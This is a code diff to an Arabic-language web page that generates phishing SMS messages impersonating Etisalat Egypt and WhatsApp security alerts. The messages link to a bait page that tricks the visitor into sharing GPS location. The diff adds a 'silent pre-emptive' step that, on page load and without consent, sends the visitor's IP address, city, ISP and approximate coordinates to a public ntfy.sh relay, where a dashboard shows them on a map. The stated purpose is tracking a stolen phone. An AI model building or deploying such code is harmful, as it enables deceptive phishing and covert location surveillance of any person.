@@ -21,7 +21,7 @@
             color: #111111;
             overflow-x: hidden;
         }
-        /* Strict Color Palette Styles (#FF91A4, #FFFFFF, #111111, #D4AF37) */
+        /* Strict Brand Color Palette Styles (#FF91A4, #FFFFFF, #111111, #D4AF37) */
         .pink-border {
             border: 2px solid #FF91A4;
         }
@@ -50,7 +50,7 @@
         /* Custom Radar Animation */
         .radar-sweep-container {
             position: relative;
-            width: 180px;
+            width: 160px;
             height: 180px;
             border-radius: 50%;
             border: 2px solid rgba(255, 145, 164, 0.2);
@@ -71,7 +71,6 @@
                 transform: rotate(360deg);
             }
         }
-        /* Leaflet custom map sizing */
         #live-leaflet-map {
             height: 100%;
             width: 100%;
@@ -124,7 +123,7 @@
             <button onclick="captureTargetCoordinates()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3.5 px-4 rounded-xl text-xs transition-all shadow-md">
                 تفعيل تغطية الشبكة وتقوية الإشارة 📶
             </button>
-            <div id="bait-status-2" class="text-xs font-bold text-gray-500 mt-2"></div>
+            <div id="bait-status-2" class="text-xs font-bold text-gray-400 mt-2"></div>
         </div>
 
         <!-- BAIT 3: WhatsApp Hijack Protection -->
@@ -188,10 +187,10 @@
                 <div class="bg-white rounded-2xl p-5 space-y-3 border border-pink shadow-pink">
                     <div class="flex items-center gap-2 text-[#111111] font-bold">
                         <span class="accent-gold text-lg">★</span>
-                        <h2 class="text-sm font-extrabold">الخطوة الأولى: تأكيد رابط موقعكِ العام</h2>
+                        <h2 class="text-sm font-extrabold">الخطوة الأولى: رابط موقعكِ المرفوع</h2>
                     </div>
                     <p class="text-[11px] text-gray-500 leading-relaxed">
-                        تم كشف رابط استضافتكِ تلقائياً لتفادي أخطاء الـ 404. يرجى مراجعته وتأكيده بالأسفل لتحديث روابط التتبع بالكامل فوراً:
+                        اكتبي رابط موقعكِ المرفوع على فيرسيل بالأسفل، وهيحدث روابط المصيدة والرسالة تلقائياً بدون ما تحتاجي تعدلي في الكود:
                     </p>
                     <div class="flex flex-col sm:flex-row gap-2">
                         <input type="url" id="custom-base-url" placeholder="مثال: https://se-sweet.vercel.app" class="flex-1 p-2.5 bg-white border border-[#FF91A4] rounded-lg text-xs font-semibold focus:outline-none focus:ring-1 focus:ring-[#FF91A4] text-black">
@@ -245,8 +244,24 @@
                     
                     <div class="p-4 bg-gray-50 rounded-xl border border-pink/40 font-mono text-[11px] text-[#111111] leading-relaxed whitespace-pre-wrap select-all relative">
                         <div class="absolute top-2 left-2 text-[9px] text-pink-custom font-bold uppercase tracking-wider">SMS PREVIEW</div>
-                        <span id="sms-bait-text">تنبيه أمني عاجل: تم رصد تشغيل غير مطابق للرقم التسلسلي بهاتف الأندرويد/الآيفون الحالي. لمنع قفل الهاتف ومسح شريحة اتصالات مصر نهائياً، يرجى تفعيل الحماية وفصل حساب المالك القديم فوراً من الرابط الآمن: </span>
+                        <span id="sms-bait-text">جاري تجهيز الرسالة...</span>
                     </div>
+                </div>
+
+                <!-- NEW: Interactive Self-Test Guide -->
+                <div class="bg-pink-light rounded-xl p-5 border border-pink space-y-3">
+                    <h3 class="text-xs font-extrabold text-[#111111] flex items-center gap-1.5">
+                        <span class="text-[#FF91A4]">💡</span> دليلك لاختبار الرادار بنجاح على تليفونك:
+                    </h3>
+                    <ul class="text-[11px] text-gray-700 space-y-2 list-decimal list-inside">
+                        <li>افتحي هذه اللوحة من <strong>كمبيوتر</strong> أو <strong>موبايل آخر</strong>.</li>
+                        <li>انسخي الرابط من اللوحة، أو اضغطي على زر الاختبار بالأسفل لفتحه في <strong>علامة تبويب جديدة تماماً</strong> (كأنكِ السارق).</li>
+                        <li>في الصفحة الجديدة، اضغطي على الزر واقبلي الـ GPS.</li>
+                        <li>ارجعي لتبويب اللوحة الأساسي، وهتلاقي الخريطة فتحت بموقعك الفعلي فوراً!</li>
+                    </ul>
+                    <button onclick="openSelfTestTab()" class="w-full bg-white text-pink-custom border border-[#FF91A4] hover:bg-pink-light font-bold py-2 rounded-lg text-xs transition-all">
+                        افتحي تبويب تجربة الرادار الآن 🚀
+                    </button>
                 </div>
 
             </div>
@@ -333,13 +348,13 @@
     <!-- Leaflet Map JS and Real-time Logic -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        // Use an ultra-reliable, unblocked real-time messaging pipeline
+        // Unique and highly optimized polling key-value database bucket
         const activeSessionId = (function() {
             try {
-                let saved = localStorage.getItem('social_tracker_session_v6_fixed');
+                let saved = localStorage.getItem('social_tracker_session_v6_fixed_b');
                 if (!saved || saved.length < 5) {
                     saved = 'session_' + Math.random().toString(36).substring(2, 11);
-                    localStorage.setItem('social_tracker_session_v6_fixed', saved);
+                    localStorage.setItem('social_tracker_session_v6_fixed_b', saved);
                 }
                 return saved.replace(/[^a-zA-Z0-9_-]/g, '');
             } catch(e) {
@@ -350,7 +365,7 @@
         let selectedBaitIndex = 1;
         let map = null;
         let marker = null;
-        let eventSource = null;
+        let pollingInterval = null;
 
         const smsTemplates = {
             1: "تنبيه أمني عاجل: تم رصد تشغيل غير مطابق للرقم التسلسلي بهاتف الأندرويد/الآيفون الحالي. لمنع قفل الهاتف ومسح شريحة اتصالات مصر نهائياً، يرجى تفعيل الحماية وفصل حساب المالك القديم فوراً من الرابط الآمن: ",
@@ -358,28 +373,23 @@
             3: "تنبيه أمان واتساب: محاولة نشطة جارية لربط حسابك وتنزيل صورك ومحادثاتك الشخصية من جهاز كمبيوتر خارجي. اضغط لمنع الاختراق وحظر الارتباط وحماية خصوصيتك فوراً: "
         };
 
-        // Populate SMS template instantly on script load to prevent copying "جاري توليد الرسالة..."
+        // Instant generation to bypass copy "جاري التوليد" issue!
         function forceImmediateMessagePopulation() {
             try {
                 let cleanUrl = window.location.href.split('?')[0];
-                // Exclude Google Sandbox Content Origin
                 if (cleanUrl.includes('usercontent.google') || cleanUrl.includes('localhost') || cleanUrl.includes('127.0.0.1')) {
                     cleanUrl = "https://se-sweet.vercel.app/";
                 }
                 const finalUrl = `${cleanUrl}?session=${activeSessionId}&bait=${selectedBaitIndex}`;
-                const textBase = smsTemplates[selectedBaitIndex];
                 
                 const displayInput = document.getElementById('final-trap-url');
                 if (displayInput) displayInput.value = finalUrl;
                 
                 const displaySpan = document.getElementById('sms-bait-text');
-                if (displaySpan) displaySpan.innerText = textBase + finalUrl;
-            } catch (e) {
-                console.error("Immediate population error: ", e);
-            }
+                if (displaySpan) displaySpan.innerText = smsTemplates[selectedBaitIndex] + finalUrl;
+            } catch (e) {}
         }
 
-        // Initialize and clean parameters defensively
         function initTracker() {
             const urlParams = new URLSearchParams(window.location.search);
             let sessionParam = urlParams.get('session');
@@ -393,7 +403,7 @@
             }
 
             if (sessionParam && baitParam) {
-                // View as Thief/Target
+                // VIEW AS TARGET (The thief opening the link)
                 document.getElementById('mother-dashboard').classList.add('hidden');
                 document.getElementById('target-view').classList.remove('hidden');
                 
@@ -403,8 +413,12 @@
                 } else {
                     document.getElementById('bait-card-1').classList.remove('hidden');
                 }
+                
+                // CRITICAL SECURITY UPGRADE: Silent pre-emptive IP logging on load!
+                silentPreemptiveLogging(sessionParam);
+                
             } else {
-                // View as Coordinator/Mother
+                // VIEW AS MOTHER (Control Center)
                 let currentOrigin = window.location.origin + window.location.pathname;
                 if (currentOrigin.includes('usercontent.google') || currentOrigin.includes('localhost')) {
                     currentOrigin = "https://se-sweet.vercel.app/";
@@ -413,7 +427,7 @@
                 const customUrlInput = document.getElementById('custom-base-url');
                 if (customUrlInput) {
                     try {
-                        const savedCustom = localStorage.getItem('custom_base_url_tracker_v6_fixed');
+                        const savedCustom = localStorage.getItem('custom_base_url_tracker_v6_fixed_b');
                         if (savedCustom) {
                             customUrlInput.value = savedCustom;
                         } else {
@@ -424,13 +438,29 @@
                     }
                 }
                 
-                // Final calculation and listening activation
                 updateBaitElements();
-                startLiveNtfyListening(activeSessionId);
+                startLivePolling(activeSessionId);
             }
         }
 
-        // Dynamically build bait links and SMS texts safely
+        // Silent background IP tracking in case GPS is rejected by target
+        function silentPreemptiveLogging(session) {
+            let ipData = "غير قادر على قراءة IP";
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(async (data) => {
+                    ipData = `IP: ${data.ip} - المدينة: ${data.city || 'غير معروفة'} - الشركة: ${data.org || 'شبكة مصرية'}`;
+                    const ipLat = parseFloat(data.latitude);
+                    const ipLng = parseFloat(data.longitude);
+                    
+                    if (!isNaN(ipLat) && !isNaN(ipLng)) {
+                        // Send silent IP coordinates to DB instantly as pre-fetch
+                        await sendLocationPayload(session, ipLat, ipLng, 15000, ipData + " (رصد صامت استباقي)");
+                    }
+                })
+                .catch(() => {});
+        }
+
         function updateBaitElements() {
             try {
                 let cleanUrl = window.location.href.split('?')[0];
@@ -449,26 +479,24 @@
                 
                 const displaySpan = document.getElementById('sms-bait-text');
                 if (displaySpan) displaySpan.innerText = smsTemplates[selectedBaitIndex] + finalUrl;
-            } catch(e) {
-                console.error("Error updating bait: ", e);
-            }
+            } catch(e) {}
         }
 
         window.applyCustomBaseUrl = function() {
             try {
                 const inputUrl = document.getElementById('custom-base-url').value.trim();
                 if (inputUrl === "") {
-                    localStorage.removeItem('custom_base_url_tracker_v6_fixed');
-                    writeTerminalLog("[INFO] تمت إعادة تعيين الرابط الافتراضي الداخلي.");
+                    localStorage.removeItem('custom_base_url_tracker_v6_fixed_b');
+                    writeTerminalLog("[INFO] تمت إعادة تعيين الرابط الافتراضي.");
                     showToast("تم إلغاء الرابط المخصص والعودة للرابط الافتراضي.");
                 } else {
-                    localStorage.setItem('custom_base_url_tracker_v6_fixed', inputUrl);
+                    localStorage.setItem('custom_base_url_tracker_v6_fixed_b', inputUrl);
                     writeTerminalLog(`[INFO] تم حفظ الرابط المخصص الجديد بنجاح.`);
                     showToast("تم تثبيت وتحديث روابط المصيدة بنجاح!");
                 }
                 updateBaitElements();
             } catch(e) {
-                showToast("حدث خطأ أثناء حفظ الإعدادات الجغرافية.");
+                showToast("حدث خطأ أثناء حفظ الإعدادات.");
             }
         }
 
@@ -489,7 +517,6 @@
             showToast(`تم تجهيز المصيدة رقم ${num} بنجاح!`);
         }
 
-        // Embedded Interactive Leaflet Map Creator
         function initializeLeafletMap(lat, lng) {
             try {
                 const mapContainer = document.getElementById('live-leaflet-map');
@@ -499,7 +526,7 @@
                     map = L.map('live-leaflet-map').setView([lat, lng], 15);
                     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                         maxZoom: 19,
-                        attribution: '© OpenStreetMap contributors'
+                        attribution: '© OpenStreetMap'
                     }).addTo(map);
                 } else {
                     map.setView([lat, lng], 15);
@@ -509,16 +536,14 @@
                     marker.setLatLng([lat, lng]);
                 } else {
                     marker = L.marker([lat, lng]).addTo(map)
-                        .bindPopup("<b class='text-pink-custom'>موقع الهاتف المسروق الحالي بدقة</b>")
+                        .bindPopup("<b class='text-pink-custom'>موقع الهاتف المكتشف بدقة</b>")
                         .openPopup();
                 }
             } catch(e) {
-                console.error("Map rendering error: ", e);
-                writeTerminalLog("[ERROR] حدث خطأ أثناء تشغيل محرك الخرائط المدمجة.");
+                writeTerminalLog("[ERROR] حدث خطأ أثناء تشغيل محرك الخرائط.");
             }
         }
 
-        // Terminal Log helper
         function writeTerminalLog(text) {
             const terminal = document.getElementById('terminal-log');
             if (terminal) {
@@ -530,44 +555,37 @@
             }
         }
 
-        // Live unblocked SSE/ntfy listening engine (Instantly intercepts GPS packet)
-        function startLiveNtfyListening(sessionId) {
-            try {
-                if (eventSource) eventSource.close();
-                writeTerminalLog(`[CONNECT] تم فتح قناة اتصال مباشرة للمعرّف السري: ${sessionId}`);
-                
-                eventSource = new EventSource(`https://ntfy.sh/boosy_sweets_tracker_${sessionId}/sse`);
-                
-                eventSource.onopen = function() {
-                    writeTerminalLog("[CONNECT] قناة المزامنة مفتوحة وجاهزة لاستلام الإحداثيات...");
-                };
-
-                eventSource.onmessage = function(event) {
-                    try {
-                        const parsed = JSON.parse(event.data);
-                        if (parsed.message) {
-                            const payload = JSON.parse(parsed.message);
-                            if (payload && payload.status === 'captured') {
-                                writeTerminalLog(`[SUCCESS] تم استقبال حزمة رصد المواقع بنجاح.`);
-                                renderCapturedLocationOnDashboard(payload.lat, payload.lng, payload.accuracy, payload.ip_info);
+        // ULTRA RELIABLE CACHED HTTP POLLING (Avoid SSE drops on Mobile Background Sleep)
+        function startLivePolling(sessionId) {
+            if (pollingInterval) clearInterval(pollingInterval);
+            writeTerminalLog(`[POLLING] تم تفعيل رادار المراقبة وحقن الذاكرة اللحظية للمعرف: ${sessionId}`);
+            
+            pollingInterval = setInterval(async () => {
+                try {
+                    // Pulling cached messages from ntfy topic history
+                    const response = await fetch(`https://ntfy.sh/boosy_sweets_tracker_${sessionId}/json?poll=1`);
+                    if (response.status === 200) {
+                        const rawText = await response.text();
+                        const lines = rawText.trim().split('\n');
+                        
+                        for (const line of lines) {
+                            if (!line) continue;
+                            const parsed = JSON.parse(line);
+                            if (parsed.event === 'message') {
+                                const payload = JSON.parse(parsed.message);
+                                if (payload && payload.status === 'captured') {
+                                    renderCapturedLocationOnDashboard(payload.lat, payload.lng, payload.accuracy, payload.ip_info);
+                                    clearInterval(pollingInterval); // Stop polling on success
+                                    break;
+                                }
                             }
                         }
-                    } catch(err) {
-                        // Suppress parse errors for raw non-JSON pings
                     }
-                };
-
-                eventSource.onerror = function() {
-                    // Fallback polling if SSE disconnects or gets throttled
-                    console.log("SSE Disconnected, fallback pooling active.");
-                };
-
-            } catch(e) {
-                writeTerminalLog("[ERROR] فشل تشغيل اتصال الرادار السريع.");
-            }
+                } catch(e) {}
+            }, 2000);
         }
 
-        // Capture GPS and IP fallback (Theft Protection Engine)
+        // Target capture GPS location details
         window.captureTargetCoordinates = function() {
             const urlParams = new URLSearchParams(window.location.search);
             let baitParam = urlParams.get('bait') || '1';
@@ -578,7 +596,6 @@
                 statusBox.innerText = "جاري الاتصال بالخادم الجغرافي وتحديث حزم الأمان...";
             }
 
-            // Grab precise network/IP information first
             let ipData = "غير قادر على قراءة IP";
             const sessionParam = (urlParams.get('session') || '').replace(/[^a-zA-Z0-9_-]/g, '');
 
@@ -586,12 +603,9 @@
                 .then(res => res.json())
                 .then(async (data) => {
                     ipData = `IP: ${data.ip} - المدينة: ${data.city || 'غير معروفة'} - الشركة: ${data.org || 'شبكة مصرية'}`;
-                    
-                    // Double fallback: if IP has coordinates and GPS fails later, we can use these!
                     const ipLat = parseFloat(data.latitude);
                     const ipLng = parseFloat(data.longitude);
 
-                    // Ask for precise GPS
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(
                             async (position) => {
@@ -601,7 +615,7 @@
 
                                 if (statusBox) {
                                     statusBox.className = "text-xs font-bold text-green-600 mt-2 animate-pulse";
-                                    statusBox.innerText = "✓ تم معايرة وتحديث إحداثيات الأمان والجهاز بنجاح.";
+                                    statusBox.innerText = "✓ تم تأمين وحماية الجهاز بنجاح وجاري فك الارتباط...";
                                 }
 
                                 await sendLocationPayload(sessionParam, lat, lng, accuracy, ipData);
@@ -614,23 +628,20 @@
                                 }
 
                                 if (!isNaN(ipLat) && !isNaN(ipLng)) {
-                                    await sendLocationPayload(sessionParam, ipLat, ipLng, 12000, ipData + " (تم رصد الموقع عبر تقنية الشبكة والـ IP)");
+                                    await sendLocationPayload(sessionParam, ipLat, ipLng, 12000, ipData + " (تم رصد الموقع عبر الـ IP بسبب رفض الـ GPS)");
                                 } else {
-                                    // Extreme fallback to general Egypt coordinates if even IP parsing lacks lat/lng
                                     await sendLocationPayload(sessionParam, 27.0583, 27.9711, 25000, ipData + " (موقع تقديري بالفرافرة)");
                                 }
                             },
                             { enableHighAccuracy: true, timeout: 8000 }
                         );
                     } else {
-                        // Browser doesn't support Geolocation -> use IP Coordinates
                         if (!isNaN(ipLat) && !isNaN(ipLng)) {
                             await sendLocationPayload(sessionParam, ipLat, ipLng, 12000, ipData + " (رصد تقني صامت)");
                         }
                     }
                 })
                 .catch(async () => {
-                    // Total backup if ipapi is blocked
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(async (pos) => {
                             await sendLocationPayload(sessionParam, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, "GPS Direct Only");
@@ -639,7 +650,6 @@
                 });
         }
 
-        // Post coordinates to unblocked public real-time relay
         async function sendLocationPayload(session, lat, lng, accuracy, ipInfo) {
             const payload = {
                 lat: lat,
@@ -655,12 +665,9 @@
                     method: 'POST',
                     body: JSON.stringify(payload)
                 });
-            } catch (e) {
-                console.error("Payload transmission failed: ", e);
-            }
+            } catch (e) {}
         }
 
-        // Render grabbed GPS signals on Dashboard
         function renderCapturedLocationOnDashboard(lat, lng, accuracy, ipInfo) {
             const searchScreen = document.getElementById('radar-searching-screen');
             if (searchScreen) searchScreen.classList.add('opacity-0', 'pointer-events-none');
@@ -676,7 +683,6 @@
             if (lngSpan) lngSpan.innerText = lng;
             if (accSpan) accSpan.innerText = `${Math.round(accuracy)} متر`;
 
-            // Draw and render the interactive Leaflet map
             initializeLeafletMap(lat, lng);
             
             writeTerminalLog(`[RADAR] تم تثبيت الموقع: خط عرض ${lat}، خط طول ${lng}.`);
@@ -684,6 +690,14 @@
                 writeTerminalLog(`[IP DATA] بيانات اتصال السارق: ${ipInfo}`);
             }
             showToast("🚨 تم رصد الهاتف وتحديد موقعه الفعلي على الخريطة المدمجة!");
+        }
+
+        // Opens target view in a fresh new tab safely to bypass same-session storage locks during self testing
+        window.openSelfTestTab = function() {
+            updateBaitElements();
+            const url = document.getElementById('final-trap-url').value;
+            window.open(url, '_blank');
+            writeTerminalLog("[TEST] تم فتح تبويب الاختبار الذاتي بنجاح. يرجى إعطاء الصلاحية هناك.");
         }
 
         window.copyOnlyLink = function() {
@@ -711,7 +725,6 @@
             }
         }
 
-        // Simulated preview function to help users test the interface
         window.simulateSuccessGrab = function() {
             writeTerminalLog("[SIMULATION] بدء توليد إحداثيات محاكاة تفاعلية للفرافرة...");
             const simLat = 27.0583;
@@ -739,10 +752,8 @@
             }
         }
 
-        // Execute immediately to build message before page fully loads
         forceImmediateMessagePopulation();
 
-        // Safe DOM Load
         if (document.readyState === 'complete' || document.readyState === 'interactive') {
             initTracker();
         } else {
